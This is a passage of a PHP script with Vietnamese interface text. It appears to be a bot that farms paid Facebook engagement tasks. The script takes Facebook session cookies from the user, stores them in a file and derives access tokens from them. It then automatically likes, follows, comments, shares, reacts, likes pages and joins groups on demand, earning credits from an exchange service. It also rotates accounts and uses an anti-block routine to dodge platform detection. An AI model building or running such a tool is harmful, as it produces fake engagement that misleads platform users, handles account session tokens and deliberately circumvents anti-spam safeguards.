                    ketnoimangV1();
                    $token_eaab = lay_token_moi_v1($cookie);
                    $tenfb = json_decode(file_get_contents('https://graph.facebook.com/me/?access_token=' . $token_eaab))->{'name'};
                    $idfb = json_decode(file_get_contents('https://graph.facebook.com/me/?access_token=' . $token_eaab))->{'id'};
                }

                if ($idfb == '') {
                    $page = thongtin('me', $cookie, $useragent);
                    $idfb = explode('%', explode('?lst=', $page)[1])[0];
                }
                if ($idfb == '') {
                    ketnoimangV1();
                    $idfb = json_decode(file_get_contents('https://graph.facebook.com/me/?access_token=' . $token_eaab))->{'id'};
                }
                if ($idfb == '') {
                    $page = thongtin('me', $cookie, $useragent);
                    $idfb = explode('%', explode('?lst=', $page)[1])[0];
                }
                if ($idfb == '') {
                    ketnoimangV1();
                    $idfb = json_decode(file_get_contents('https://graph.facebook.com/me/?access_token=' . $token_eaab))->{'id'};
                }
                if ($idfb == '') {
                    $page = thongtin('me', $cookie, $useragent);
                    $idfb = explode('%', explode('?lst=', $page)[1])[0];
                    if ($idfb == '') {
                        ketnoimangV1();
                        $tenfb = namefb($cookie);
                        $idfb = explode(';', explode('c_user=', $cookie)[1])[0];
                        if ($tenfb == '') {
                            ketnoimangV1();
                            $dem_check_die++;
                            if ($dem_check_die > 2) {
                                $dem_check_die = 0;
                                echo $red . "Cookie die";
                                array_splice($khoToken, $xz, 1);
                                if ($nhaptkdie == "y" or $nhaptkdie == "Y") {
                                    echo $daucau2 . "Nhập Cookie Facebook.$yellow Dừng Thì Enter Nha\n";
                                    unlink("File_cookie_FB.txt");
                                    for ($a = 1; $a < 999999; $a++) {
                                        echo $daucau2 . "Nhập Cookie Thứ $a: $vang";
                                        $nhapck = (string)trim(fgets(STDIN));
                                        if ($nhapck == '') {
                                            break;
                                        }
                                        array_push($khoToken, $nhapck);
                                    }
                                    $js = json_encode($khoToken);
                                    $k = fopen("File_cookie_FB.txt", "a+");
                                    fwrite($k, $js);
                                    fclose($k);
                                }
                                $spam = 1;
                                break;
                            }
                        }
                    }
                }

                if ($hetnvlike + $hetnvsub + $hetnvcmt + $hetnvshare + $hetnvcx + $hetnvcxcmt + $hetnvpage + $hetnvgroup == 0) {
                    for ($x = 300; $x--; $x) {
                        print "\033[1;30m Tất cả nhiệm vụ đã hết đợi \033[1;31m| \033[1;33m$x \033[1;31m|\033[1;30m Giây";
                        sleep(1);
                        print "\r                                          \r";
                    }
                }

                //nvlike
                if ($rand == 'like') {
                    //ketnoimangV1();
                    //$x = getnv('like');
                    $x = getnv("");
                    if (count($x) != "") {
                        $info = $x;
                        $d = "0";
                        while (true) {
                            $id = $info["" . $d . ""]["idpost"];
                            if ($id < '1') {
                                print "$daucau2 \033[1;34mLikePost tạm thời hết nhiệm vụ\r";
                                $hetnvlike = 0;
                                if (count($khoToken) > 1) {
                                    $demhetnv++;
                                }
                                if ($demhetnv == 4) {
                                    $spam = 1;
                                }
                                break;
                            } else {
                                if (strpos($loainvtt, '1') !== false) {
                                    $hetnvlike = 1;
                                }
                                if (strpos($loainvtt, '2') !== false) {
                                    $hetnvsub = 1;
                                }
                                if (strpos($loainvtt, '3') !== false) {
                                    $hetnvcmt = 1;
                                }
                                if (strpos($loainvtt, '4') !== false) {
                                    $hetnvshare = 1;
                                }
                                if (strpos($loainvtt, '5') !== false) {
                                    $hetnvcx = 1;
                                }
                                if (strpos($loainvtt, '6') !== false) {
                                    $hetnvcxcmt = 1;
                                }
                                if (strpos($loainvtt, '7') !== false) {
                                    $hetnvpage = 1;
                                }
                                if (strpos($loainvtt, '8') !== false) {
                                    $hetnvgroup = 1;
                                }
                                $demhetnv = 0;
                                $d += 1;
                                //ketnoimangV1();
                                $g = camxuc($id, 'LIKE', $cookie);
                            }
                            $hoanthanh = nhantien($id, "");

                            date_default_timezone_set('Asia/Ho_Chi_Minh');
                            $t = date('H:i:s');
                            $rd = rand(1, 7);
                            //$id = substr($id, 0, 15);
                            if ($hoanthanh["mess"]) {
                                $nv += 1;
                                $sodu += 400;
                                $duocne = $duocne + 1;
                                //$tt = " \033[1;31m[\033[1;30m".$ytb."\033[1;31m]\033[1;33m[".$duocne."\033[1;33m] \033[1;31m| \033[1;36m$t\033[1;31m | \033[1;3".$rd."m LIKE  \033[1;31m| \033[1;30mSUCCESS \033[1;31m| \033[1;32m+300 \033[1;31m| \033[1;33m".$sodu."\n";
                                $tt = "\r\033[1;91m[\033[1;93m" . $duocne . "\033[1;91m]\033[1;91m | \033[1;96m" . date("H:i") . "\033[1;91m |\033[1;93m" . $_SESSION["C_LIKE"] . "\033[1;91m| \033[1;97m" . $id . "\033[1;91m |\033[1;92m +400 \033[1;91m| \033[1;93m" . $sodu . "\e[0m\033[1;91m |\n";

                                for ($i = 1; $i < (strlen($tt) + 1); $i++) {
                                    print $tt[$i];
                                    usleep(200);
                                }
                                if ($spam == 1) {
                                    break;
                                }
                                if (count($khoToken) > 1) {
                                    if ($duocne % $doiacc == 0) {
                                        $spam = 1;
                                        break;
                                    } else {
                                        usleep(1);
                                    }
                                } else {
                                    usleep(1);
                                }
                                loadtime('delaylike');
                                if ($nv == $nhiemvu) {
                                    chongbl('block');

                                    $nv = "0";
                                }
                            } else {
                                print "\r";
                            }
                        }
                    } else {

                        print "$daucau2 \033[1;34mLikePost tạm thời hết nhiệm vụ\r";
                        $hetnvlike = 0;
                    }
                    //like2
                } elseif ($rand == 'sub') {
                    //ketnoimangV1();
                    //$x = getnv('like');
                    $x = getnv("/subcheo");
                    if (count($x) != "") {
                        $info = $x;
                        $d = "0";
                        while (true) {
                            $id = $info["" . $d . ""]["idpost"];
                            if ($id < '1') {
                                print "$daucau2 \033[1;34mFollow tạm thời hết nhiệm vụ\r";
                                $hetnvsub = 0;
                                if (count($khoToken) > 1) {
                                    $demhetnv++;
                                }
                                if ($demhetnv == 4) {
                                    $spam = 1;
                                }
                                break;
                            } else {
                                if (strpos($loainvtt, '1') !== false) {
                                    $hetnvlike = 1;
                                }
                                if (strpos($loainvtt, '2') !== false) {
                                    $hetnvsub = 1;
                                }
                                if (strpos($loainvtt, '3') !== false) {
                                    $hetnvcmt = 1;
                                }
                                if (strpos($loainvtt, '4') !== false) {
                                    $hetnvshare = 1;
                                }
                                if (strpos($loainvtt, '5') !== false) {
                                    $hetnvcx = 1;
                                }
                                if (strpos($loainvtt, '6') !== false) {
                                    $hetnvcxcmt = 1;
                                }
                                if (strpos($loainvtt, '7') !== false) {
                                    $hetnvpage = 1;
                                }
                                if (strpos($loainvtt, '8') !== false) {
                                    $hetnvgroup = 1;
                                }
                                $demhetnv = 0;
                                $d += 1;
                                //ketnoimangV1();
                                $g = follow($id, $cookie);
                            }
                            $hoanthanh = nhantien($id, "/subcheo");

                            date_default_timezone_set('Asia/Ho_Chi_Minh');
                            $t = date('H:i:s');
                            $rd = rand(1, 7);
                            //$id = substr($id, 0, 15);
                            if ($hoanthanh["mess"]) {
                                $nv += 1;
                                $sodu += 600;
                                $duocne = $duocne + 1;
                                //$tt = " \033[1;31m[\033[1;30m".$ytb."\033[1;31m]\033[1;33m[".$duocne."\033[1;33m] \033[1;31m| \033[1;36m$t\033[1;31m | \033[1;3".$rd."m LIKE  \033[1;31m| \033[1;30mSUCCESS \033[1;31m| \033[1;32m+300 \033[1;31m| \033[1;33m".$sodu."\n";
                                $tt = "\r\033[1;91m[\033[1;93m" . $duocne . "\033[1;91m]\033[1;91m | \033[1;96m" . date("H:i") . "\033[1;91m |\033[1;93m" . $_SESSION["C_FOLLOW"] . "\033[1;91m| \033[1;97m" . $id . "\033[1;91m |\033[1;92m +600 \033[1;91m| \033[1;93m" . $sodu . "\e[0m\033[1;91m |\n";

                                for ($i = 1; $i < (strlen($tt) + 1); $i++) {
                                    print $tt[$i];
                                    usleep(200);
                                }
                                if ($spam == 1) {
                                    break;
                                }
                                if (count($khoToken) > 1) {
                                    if ($duocne % $doiacc == 0) {
                                        $spam = 1;
                                        break;
                                    } else {
                                        usleep(1);
                                    }
                                } else {
                                    usleep(1);
                                }
                                loadtime('delayfollow');
                                if ($nv == $nhiemvu) {
                                    chongbl('block');

                                    $nv = "0";
                                }
                            } else {
                                print "\r";
                            }
                        }
                    } else {
                        print "$daucau2 \033[1;34mFollow tạm thời hết nhiệm vụ\r";
                        $hetnvsub = 0;
                    }
                    //like2
                } elseif ($rand == 'cmt') {
                    //ketnoimangV1();
                    //$x = getnv('like');
                    $x = getnv("/cmtcheo");
                    if (count($x) != "") {
                        $info = $x;
                        $d = "0";
                        while (true) {
                            $id = $info["" . $d . ""]["idpost"];
                            $nd = $info["" . $d . ""]["nd"];
                            $json = json_decode($nd, true);
                            $msg = $json[0];

                            if ($id < '1') {
                                print "$daucau2 \033[1;34m Comment tạm thời hết nhiệm vụ\r";
                                $hetnvcmt = 0;
                                if (count($khoToken) > 1) {
                                    $demhetnv++;
                                }
                                if ($demhetnv == 4) {
                                    $spam = 1;
                                }
                                break;
                            } else {
                                if (strpos($loainvtt, '1') !== false) {
                                    $hetnvlike = 1;
                                }
                                if (strpos($loainvtt, '2') !== false) {
                                    $hetnvsub = 1;
                                }
                                if (strpos($loainvtt, '3') !== false) {
                                    $hetnvcmt = 1;
                                }
                                if (strpos($loainvtt, '4') !== false) {
                                    $hetnvshare = 1;
                                }
                                if (strpos($loainvtt, '5') !== false) {
                                    $hetnvcx = 1;
                                }
                                if (strpos($loainvtt, '6') !== false) {
                                    $hetnvcxcmt = 1;
                                }
                                if (strpos($loainvtt, '7') !== false) {
                                    $hetnvpage = 1;
                                }
                                if (strpos($loainvtt, '8') !== false) {
                                    $hetnvgroup = 1;
                                }
                                $demhetnv = 0;
                                $d += 1;
                                //ketnoimangV1();
                                //$g = cmt_fb_cookie_new($id, $cookie, $msg);
                            }
                            $hoanthanh = nhantien($id, "/cmtcheo");

                            date_default_timezone_set('Asia/Ho_Chi_Minh');
                            $t = date('H:i:s');
                            $rd = rand(1, 7);
                            //$id = substr($id, 0, 15);
                            if ($hoanthanh["mess"]) {
                                $nv += 1;
                                $sodu += 600;
                                $duocne = $duocne + 1;
                                //$tt = " \033[1;31m[\033[1;30m".$ytb."\033[1;31m]\033[1;33m[".$duocne."\033[1;33m] \033[1;31m| \033[1;36m$t\033[1;31m | \033[1;3".$rd."m LIKE  \033[1;31m| \033[1;30mSUCCESS \033[1;31m| \033[1;32m+300 \033[1;31m| \033[1;33m".$sodu."\n";
                                $tt = "\r\033[1;91m[\033[1;93m" . $duocne . "\033[1;91m]\033[1;91m | \033[1;96m" . date("H:i") . "\033[1;91m |\033[1;93m" . $_SESSION["C_CMT"] . "\033[1;91m| \033[1;97m" . $id . "\033[1;91m |\033[1;92m +600 \033[1;91m| \033[1;93m" . $sodu . "\e[0m\033[1;91m |\033[1;96m $msg\n";

                                for ($i = 1; $i < (strlen($tt) + 1); $i++) {
                                    print $tt[$i];
                                    usleep(200);
                                }
                                if ($spam == 1) {
                                    break;
                                }
                                if (count($khoToken) > 1) {
                                    if ($duocne % $doiacc == 0) {
                                        $spam = 1;
                                        break;
                                    } else {
                                        usleep(1);
                                    }
                                } else {
                                    usleep(1);
                                }
                                loadtime('delaycmt');
                                if ($nv == $nhiemvu) {
                                    chongbl('block');

                                    $nv = "0";
                                }
                            } else {
                                print "\r";
                            }
                        }
                    } else {
                        print "$daucau2 \033[1;34m Comment tạm thời hết nhiệm vụ\r";
                        $hetnvcmt = 0;
                    }
                    //like2
                } elseif ($rand == 'share') {
                    //ketnoimangV1();
                    //$x = getnv('like');
                    $x = getnv("/sharecheo");
                    if (count($x) != "") {
                        $info = $x;
                        $d = "0";
                        while (true) {
                            $id = $info["" . $d . ""]["idpost"];
                            if ($id < '1') {
                                print "$daucau2 \033[1;34m Share tạm thời hết nhiệm vụ\r";
                                $hetnvshare = 0;
                                if (count($khoToken) > 1) {
                                    $demhetnv++;
                                }
                                if ($demhetnv == 4) {
                                    $spam = 1;
                                }
                                break;
                            } else {
                                if (strpos($loainvtt, '1') !== false) {
                                    $hetnvlike = 1;
                                }
                                if (strpos($loainvtt, '2') !== false) {
                                    $hetnvsub = 1;
                                }
                                if (strpos($loainvtt, '3') !== false) {
                                    $hetnvcmt = 1;
                                }
                                if (strpos($loainvtt, '4') !== false) {
                                    $hetnvshare = 1;
                                }
                                if (strpos($loainvtt, '5') !== false) {
                                    $hetnvcx = 1;
                                }
                                if (strpos($loainvtt, '6') !== false) {
                                    $hetnvcxcmt = 1;
                                }
                                if (strpos($loainvtt, '7') !== false) {
                                    $hetnvpage = 1;
                                }
                                if (strpos($loainvtt, '8') !== false) {
                                    $hetnvgroup = 1;
                                }
                                $demhetnv = 0;
                                $d += 1;
                                //ketnoimangV1();
                                $g = share_msg($id, $cookie, "");
                            }
                            $hoanthanh = nhantien($id, "/sharecheo");

                            date_default_timezone_set('Asia/Ho_Chi_Minh');
                            $t = date('H:i:s');
                            $rd = rand(1, 7);
                            //$id = substr($id, 0, 15);
                            if ($hoanthanh["mess"]) {
                                $nv += 1;
                                $sodu += 600;
                                $duocne = $duocne + 1;
                                //$tt = " \033[1;31m[\033[1;30m".$ytb."\033[1;31m]\033[1;33m[".$duocne."\033[1;33m] \033[1;31m| \033[1;36m$t\033[1;31m | \033[1;3".$rd."m LIKE  \033[1;31m| \033[1;30mSUCCESS \033[1;31m| \033[1;32m+300 \033[1;31m| \033[1;33m".$sodu."\n";
                                $tt = "\r\033[1;91m[\033[1;93m" . $duocne . "\033[1;91m]\033[1;91m | \033[1;96m" . date("H:i") . "\033[1;91m |\033[1;93m" . $_SESSION["C_SHARE"] . "\033[1;91m| \033[1;97m" . $id . "\033[1;91m |\033[1;92m +600 \033[1;91m| \033[1;93m" . $sodu . "\e[0m\033[1;91m |\n";

                                for ($i = 1; $i < (strlen($tt) + 1); $i++) {
                                    print $tt[$i];
                                    usleep(200);
                                }
                                if ($spam == 1) {
                                    break;
                                }
                                if (count($khoToken) > 1) {
                                    if ($duocne % $doiacc == 0) {
                                        $spam = 1;
                                        break;
                                    } else {
                                        usleep(1);
                                    }
                                } else {
                                    usleep(1);
                                }
                                loadtime('delayshare');
                                if ($nv == $nhiemvu) {
                                    chongbl('block');

                                    $nv = "0";
                                }
                            } else {
                                print "\r";
                            }
                        }
                    } else {

                        print "$daucau2 \033[1;34m Share tạm thời hết nhiệm vụ\r";
                        $hetnvshare = 0;
                    }
                    //like2
                } elseif ($rand == 'sharend') {
                    //ketnoimangV1();
                    //$x = getnv('like');
                    $x = getnv("/sharecheokemnoidung");
                    if (count($x) != "") {
                        $info = $x;
                        $d = "0";
                        while (true) {
                            $id = $info["" . $d . ""]["idpost"];
                            $nd = $info["" . $d . ""]["nd"];
                            $json = json_decode($nd, true);
                            $msg = $json[0];

                            if ($id < '1') {
                                print "$daucau2 \033[1;34m Share nội kèm nội dung tạm thời hết nhiệm vụ\r";
                                $hetnvcmt = 0;
                                if (count($khoToken) > 1) {
                                    $demhetnv++;
                                }
                                if ($demhetnv == 4) {
                                    $spam = 1;
                                }
                                break;
                            } else {
                                if (strpos($loainvtt, '1') !== false) {
                                    $hetnvlike = 1;
                                }
                                if (strpos($loainvtt, '2') !== false) {
                                    $hetnvsub = 1;
                                }
                                if (strpos($loainvtt, '3') !== false) {
                                    $hetnvcmt = 1;
                                }
                                if (strpos($loainvtt, '4') !== false) {
                                    $hetnvshare = 1;
                                }
                                if (strpos($loainvtt, '5') !== false) {
                                    $hetnvcx = 1;
                                }
                                if (strpos($loainvtt, '6') !== false) {
                                    $hetnvcxcmt = 1;
                                }
                                if (strpos($loainvtt, '7') !== false) {
                                    $hetnvpage = 1;
                                }
                                if (strpos($loainvtt, '8') !== false) {
                                    $hetnvgroup = 1;
                                }
                                $demhetnv = 0;
                                $d += 1;
                                //ketnoimangV1();
                                $g = share_msg($id, $cookie, $msg);
                            }
                            $hoanthanh = nhantien($id, "/sharecheokemnoidung");

                            date_default_timezone_set('Asia/Ho_Chi_Minh');
                            $t = date('H:i:s');
                            $rd = rand(1, 7);
                            //$id = substr($id, 0, 15);
                            if ($hoanthanh["mess"]) {
                                $nv += 1;
                                $sodu += 700;
                                $duocne = $duocne + 1;
                                //$tt = " \033[1;31m[\033[1;30m".$ytb."\033[1;31m]\033[1;33m[".$duocne."\033[1;33m] \033[1;31m| \033[1;36m$t\033[1;31m | \033[1;3".$rd."m LIKE  \033[1;31m| \033[1;30mSUCCESS \033[1;31m| \033[1;32m+300 \033[1;31m| \033[1;33m".$sodu."\n";
                                $tt = "\r\033[1;91m[\033[1;93m" . $duocne . "\033[1;91m]\033[1;91m | \033[1;96m" . date("H:i") . "\033[1;91m |\033[1;93m" . $_SESSION["C_SHARE2"] . "\033[1;91m| \033[1;97m" . $id . "\033[1;91m |\033[1;92m +700 \033[1;91m| \033[1;93m" . $sodu . "\e[0m\033[1;91m |\033[1;96m $msg\n";

                                for ($i = 1; $i < (strlen($tt) + 1); $i++) {
                                    print $tt[$i];
                                    usleep(200);
                                }
                                if ($spam == 1) {
                                    break;
                                }
                                if (count($khoToken) > 1) {
                                    if ($duocne % $doiacc == 0) {
                                        $spam = 1;
                                        break;
                                    } else {
                                        usleep(1);
                                    }
                                } else {
                                    usleep(1);
                                }
                                loadtime('delayshare');
                                if ($nv == $nhiemvu) {
                                    chongbl('block');

                                    $nv = "0";
                                }
                            } else {
                                print "\r";
                            }
                        }
                    } else {
                        print "$daucau2 \033[1;34m Share 2 tạm thời hết nhiệm vụ\r";
                        $hetnvcmt = 0;
                    }
                    //like2
                } elseif ($rand == 'cx') {
                    //ketnoimangV1();
                    //$x = getnv('like');
                    $x = getnv("/camxuccheo");
                    if (count($x) != "") {
                        $info = $x;
                        $d = "0";
                        while (true) {
                            $id = $info["" . $d . ""]["idpost"];
                            $type = $info["" . $d . ""]["loaicx"];
                            if ($id < '1') {
                                print "$daucau2 \033[1;34m Cam xuc tạm thời hết nhiệm vụ\r";
                                $hetnvcx = 0;
                                if (count($khoToken) > 1) {
                                    $demhetnv++;
                                }
                                if ($demhetnv == 4) {
                                    $spam = 1;
                                }
                                break;
                            } else {
                                if (strpos($loainvtt, '1') !== false) {
                                    $hetnvlike = 1;
                                }
                                if (strpos($loainvtt, '2') !== false) {
                                    $hetnvsub = 1;
                                }
                                if (strpos($loainvtt, '3') !== false) {
                                    $hetnvcmt = 1;
                                }
                                if (strpos($loainvtt, '4') !== false) {
                                    $hetnvshare = 1;
                                }
                                if (strpos($loainvtt, '5') !== false) {
                                    $hetnvcx = 1;
                                }
                                if (strpos($loainvtt, '6') !== false) {
                                    $hetnvcxcmt = 1;
                                }
                                if (strpos($loainvtt, '7') !== false) {
                                    $hetnvpage = 1;
                                }
                                if (strpos($loainvtt, '8') !== false) {
                                    $hetnvgroup = 1;
                                }
                                $demhetnv = 0;
                                $d += 1;
                                //ketnoimangV1();
                                camxuc($id, $type, $cookie);
                            }
                            $hoanthanh = nhantiencx($id, $type);

                            date_default_timezone_set('Asia/Ho_Chi_Minh');
                            $t = date('H:i:s');
                            $rd = rand(1, 7);
                            //$id = substr($id, 0, 15);
                            if ($hoanthanh["mess"]) {
                                $nv += 1;
                                $sodu += 400;
                                $duocne = $duocne + 1;
                                //$tt = " \033[1;31m[\033[1;30m".$ytb."\033[1;31m]\033[1;33m[".$duocne."\033[1;33m] \033[1;31m| \033[1;36m$t\033[1;31m | \033[1;3".$rd."m LIKE  \033[1;31m| \033[1;30mSUCCESS \033[1;31m| \033[1;32m+300 \033[1;31m| \033[1;33m".$sodu."\n";
                                $tt = "\r\033[1;91m[\033[1;93m" . $duocne . "\033[1;91m]\033[1;91m | \033[1;96m" . date("H:i") . "\033[1;91m |\033[1;93m" . $_SESSION["C_" . $type] . "\033[1;91m| \033[1;97m" . $id . "\033[1;91m |\033[1;92m +400 \033[1;91m| \033[1;93m" . $sodu . "\e[0m\033[1;91m |\033[1;96m $msg\n";

                                for ($i = 1; $i < (strlen($tt) + 1); $i++) {
                                    print $tt[$i];
                                    usleep(200);
                                }
                                if ($spam == 1) {
                                    break;
                                }
                                if (count($khoToken) > 1) {
                                    if ($duocne % $doiacc == 0) {
                                        $spam = 1;
                                        break;
                                    } else {
                                        usleep(1);
                                    }
                                } else {
                                    usleep(1);
                                }
                                loadtime('delaycx');
                                if ($nv == $nhiemvu) {
                                    chongbl('block');

                                    $nv = "0";
                                }
                            } else {
                                print "\r";
                            }
                        }
                    } else {
                        print "$daucau2 \033[1;34m Cam xuc tạm thời hết nhiệm vụ\r";
                        $hetnvcx = 0;
                    }
                    //like2
                } elseif ($rand == 'cxcmt') {
                    //ketnoimangV1();
                    $x = getnv('/camxuccheobinhluan');
                    if (count($x) != "") {
                        $info = $x;
                        $d = "0";
                        while (true) {
                            $id = $info["" . $d . ""]["idpost"];
                            $type = $info["" . $d . ""]["loaicx"];
                            if ($id < '1') {
                                print "$daucau2 \033[1;34m Cam xuc cmt tạm thời hết nhiệm vụ\r";
                                $hetnvcxcmt = 0;
                                if (count($khoToken) > 1) {
                                    $demhetnv++;
                                }
                                if ($demhetnv == 4) {
                                    $spam = 1;
                                }
                                break;
                            } else {
                                if (strpos($loainvtt, '1') !== false) {
                                    $hetnvlike = 1;
                                }
                                if (strpos($loainvtt, '2') !== false) {
                                    $hetnvsub = 1;
                                }
                                if (strpos($loainvtt, '3') !== false) {
                                    $hetnvcmt = 1;
                                }
                                if (strpos($loainvtt, '4') !== false) {
                                    $hetnvshare = 1;
                                }
                                if (strpos($loainvtt, '5') !== false) {
                                    $hetnvcx = 1;
                                }
                                if (strpos($loainvtt, '6') !== false) {
                                    $hetnvcxcmt = 1;
                                }
                                if (strpos($loainvtt, '7') !== false) {
                                    $hetnvpage = 1;
                                }
                                if (strpos($loainvtt, '8') !== false) {
                                    $hetnvgroup = 1;
                                }
                                $demhetnv = 0;
                                $d += 1;
                                //ketnoimangV1();
                                reaction_cmt($id, $idfb, $type, $cookie);
                            }
                            $hoanthanh =  nhantiencxcmt($id, $type);

                            date_default_timezone_set('Asia/Ho_Chi_Minh');
                            $t = date('H:i:s');
                            $rd = rand(1, 7);
                            //$id = substr($id, 0, 15);
                            if ($hoanthanh["mess"]) {
                                $nv += 1;
                                $sodu += 600;
                                $duocne = $duocne + 1;
                                //$tt = " \033[1;31m[\033[1;30m".$ytb."\033[1;31m]\033[1;33m[".$duocne."\033[1;33m] \033[1;31m| \033[1;36m$t\033[1;31m | \033[1;3".$rd."m LIKE  \033[1;31m| \033[1;30mSUCCESS \033[1;31m| \033[1;32m+300 \033[1;31m| \033[1;33m".$sodu."\n";
                                $tt = "\r\033[1;91m[\033[1;93m" . $duocne . "\033[1;91m]\033[1;91m | \033[1;96m" . date("H:i") . "\033[1;91m |\033[1;93m" . $_SESSION["C_" . $type] . "\033[1;91m| \033[1;97m" . $id . "\033[1;91m |\033[1;92m +600 \033[1;91m| \033[1;93m" . $sodu . "\e[0m\033[1;91m |\033[1;96m $msg\n";

                                for ($i = 1; $i < (strlen($tt) + 1); $i++) {
                                    print $tt[$i];
                                    usleep(200);
                                }
                                if ($spam == 1) {
                                    break;
                                }
                                if (count($khoToken) > 1) {
                                    if ($duocne % $doiacc == 0) {
                                        $spam = 1;
                                        break;
                                    } else {
                                        usleep(1);
                                    }
                                } else {
                                    usleep(1);
                                }
                                loadtime('delaycxcmt');
                                if ($nv == $nhiemvu) {
                                    chongbl('block');

                                    $nv = "0";
                                }
                            } else {
                                print "\r";
                            }
                        }
                    } else {
                        print "$daucau2 \033[1;34m Cam xuc cmt tạm thời hết nhiệm vụ\r";
                        $hetnvcxcmt = 0;
                    }
                } elseif ($rand == 'page') {
                    //ketnoimangV1();
                    $x = getnv('/likepagecheo');
                    if (count($x) != "") {
                        $info = $x;
                        $d = "0";
                        while (true) {
                            $id = $info["" . $d . ""]["idpost"];
                            if ($id < '1') {
                                print "$daucau2 \033[1;34m Page tạm thời hết nhiệm vụ\r";
                                $hetnvpage = 0;
                                if (count($khoToken) > 1) {
                                    $demhetnv++;
                                }
                                if ($demhetnv == 4) {
                                    $spam = 1;
                                }
                                break;
                            } else {
                                if (strpos($loainvtt, '1') !== false) {
                                    $hetnvlike = 1;
                                }
                                if (strpos($loainvtt, '2') !== false) {
                                    $hetnvsub = 1;
                                }
                                if (strpos($loainvtt, '3') !== false) {
                                    $hetnvcmt = 1;
                                }
                                if (strpos($loainvtt, '4') !== false) {
                                    $hetnvshare = 1;
                                }
                                if (strpos($loainvtt, '5') !== false) {
                                    $hetnvcx = 1;
                                }
                                if (strpos($loainvtt, '6') !== false) {
                                    $hetnvcxcmt = 1;
                                }
                                if (strpos($loainvtt, '7') !== false) {
                                    $hetnvpage = 1;
                                }
                                if (strpos($loainvtt, '8') !== false) {
                                    $hetnvgroup = 1;
                                }
                                $demhetnv = 0;
                                $d += 1;
                                //ketnoimangV1();
                                page($id, $cookie);
                            }
                            $hoanthanh =  nhantien($id, "/likepagecheo");

                            date_default_timezone_set('Asia/Ho_Chi_Minh');
                            $t = date('H:i:s');
                            $rd = rand(1, 7);
                            //$id = substr($id, 0, 15);
                            if ($hoanthanh["mess"]) {
                                $nv += 1;
                                $sodu += 700;
                                $duocne = $duocne + 1;
                                //$tt = " \033[1;31m[\033[1;30m".$ytb."\033[1;31m]\033[1;33m[".$duocne."\033[1;33m] \033[1;31m| \033[1;36m$t\033[1;31m | \033[1;3".$rd."m LIKE  \033[1;31m| \033[1;30mSUCCESS \033[1;31m| \033[1;32m+300 \033[1;31m| \033[1;33m".$sodu."\n";
                                $tt = "\r\033[1;91m[\033[1;93m" . $duocne . "\033[1;91m]\033[1;91m | \033[1;96m" . date("H:i") . "\033[1;91m |\033[1;93m" . $_SESSION["C_PAGE"] . "\033[1;91m| \033[1;97m" . $id . "\033[1;91m |\033[1;92m +700 \033[1;91m| \033[1;93m" . $sodu . "\e[0m\033[1;91m |\033[1;96m $msg\n";

                                for ($i = 1; $i < (strlen($tt) + 1); $i++) {
                                    print $tt[$i];
                                    usleep(200);
                                }
                                if ($spam == 1) {
                                    break;
                                }
                                if (count($khoToken) > 1) {
                                    if ($duocne % $doiacc == 0) {
                                        $spam = 1;
                                        break;
                                    } else {
                                        usleep(1);
                                    }
                                } else {
                                    usleep(1);
                                }
                                loadtime('delaypage');
                                if ($nv == $nhiemvu) {
                                    chongbl('block');

                                    $nv = "0";
                                }
                            } else {
                                print "\r";
                            }
                        }
                    } else {
                        print "$daucau2 \033[1;34m Page tạm thời hết nhiệm vụ\r";
                        $hetnvpage = 0;
                    }
                } elseif ($rand == 'group') {
                    //ketnoimangV1();
                    $x = getnv('/thamgianhomcheo');
                    if (count($x) != "") {
                        $info = $x;
                        $d = "0";
                        while (true) {
                            $id = $info["" . $d . ""]["idpost"];
                            if ($id < '1') {
                                print "$daucau2 \033[1;34m Page tạm thời hết nhiệm vụ\r";
                                $hetnvgroup = 0;
                                if (count($khoToken) > 1) {
                                    $demhetnv++;
                                }
                                if ($demhetnv == 4) {
                                    $spam = 1;
                                }
                                break;
                            } else {
                                if (strpos($loainvtt, '1') !== false) {
                                    $hetnvlike = 1;
                                }
                                if (strpos($loainvtt, '2') !== false) {
                                    $hetnvsub = 1;
                                }
                                if (strpos($loainvtt, '3') !== false) {
                                    $hetnvcmt = 1;
                                }
                                if (strpos($loainvtt, '4') !== false) {
                                    $hetnvshare = 1;
                                }
                                if (strpos($loainvtt, '5') !== false) {
                                    $hetnvcx = 1;
                                }
                                if (strpos($loainvtt, '6') !== false) {
                                    $hetnvcxcmt = 1;
                                }
                                if (strpos($loainvtt, '7') !== false) {
                                    $hetnvpage = 1;
                                }
                                if (strpos($loainvtt, '8') !== false) {
                                    $hetnvgroup = 1;
                                }
                                $demhetnv = 0;
                                $d += 1;
                                //ketnoimangV1();
                                group_fb($id, $useragent, $cookie);
                            }
                            $hoanthanh =  nhantien($id, "/thamgianhomcheo");

                            date_default_timezone_set('Asia/Ho_Chi_Minh');
                            $t = date('H:i:s');
                            $rd = rand(1, 7);
                            //$id = substr($id, 0, 15);
                            if ($hoanthanh["mess"]) {
                                $nv += 1;
                                $sodu += 1200;
                                $duocne = $duocne + 1;
                                //$tt = " \033[1;31m[\033[1;30m".$ytb."\033[1;31m]\033[1;33m[".$duocne."\033[1;33m] \033[1;31m| \033[1;36m$t\033[1;31m | \033[1;3".$rd."m LIKE  \033[1;31m| \033[1;30mSUCCESS \033[1;31m| \033[1;32m+300 \033[1;31m| \033[1;33m".$sodu."\n";
                                $tt = "\r\033[1;91m[\033[1;93m" . $duocne . "\033[1;91m]\033[1;91m | \033[1;96m" . date("H:i") . "\033[1;91m |\033[1;93m" . $_SESSION["C_GROUP"] . "\033[1;91m| \033[1;97m" . $id . "\033[1;91m |\033[1;92m +1200 \033[1;91m| \033[1;93m" . $sodu . "\e[0m\033[1;91m |\033[1;96m $msg\n";

                                for ($i = 1; $i < (strlen($tt) + 1); $i++) {
                                    print $tt[$i];
                                    usleep(200);
                                }
                                if ($spam == 1) {
                                    break;
                                }
                                if (count($khoToken) > 1) {
                                    if ($duocne % $doiacc == 0) {
                                        $spam = 1;
                                        break;
                                    } else {
                                        usleep(1);
                                    }
                                } else {
                                    usleep(1);
                                }
                                loadtime('delaygr');
                                if ($nv == $nhiemvu) {
                                    chongbl('block');

                                    $nv = "0";
                                }
                            } else {
                                print "\r";
                            }
                        }
                    } else {
                        print "$daucau2 \033[1;34m Page tạm thời hết nhiệm vụ\r";
                        $hetnvgroup = 0;
                    }
                } else {
                    sleep(1);
                }
            }
        }
    }
}

function req($url, $cookie)
{
    $ch   = curl_init();
    curl_setopt_array(
        $ch,
        array(
            CURLOPT_URL => $url,
            CURLOPT_CUSTOMREQUEST => "GET",
            CURLOPT_FOLLOWLOCATION => TRUE,
            CURLOPT_RETURNTRANSFER => 1,
